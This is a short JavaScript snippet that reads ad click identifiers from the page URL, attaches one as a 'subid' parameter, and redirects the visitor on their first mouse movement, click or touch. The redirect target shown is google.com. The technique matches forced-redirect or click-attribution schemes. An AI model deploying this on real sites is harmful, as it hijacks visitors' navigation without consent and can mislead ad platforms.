document.addEventListener('DOMContentLoaded', function() {
		
		var urlParams = new URLSearchParams(window.location.search);
		
		var addParam = urlParams.get('gclid') || urlParams.get('gbraid') || urlParams.get('wbraid') || urlParams.get('msclkid') || urlParams.get('fbclid');
		
		var redirUrl = 'https://www.google.com';

		if (addParam) {
			var separator = redirUrl.indexOf('?') !== -1 ? '&' : '?';
			redirUrl += separator + 'subid' + '=' + encodeURIComponent(addParam);
		}

		function redirToUrl() {
			window.location.href = redirUrl;
		}

		document.addEventListener('mousemove', redirToUrl, { once: true });
		document.addEventListener('click', redirToUrl, { once: true });
		document.addEventListener('touchstart', redirToUrl, { once: true });
	});
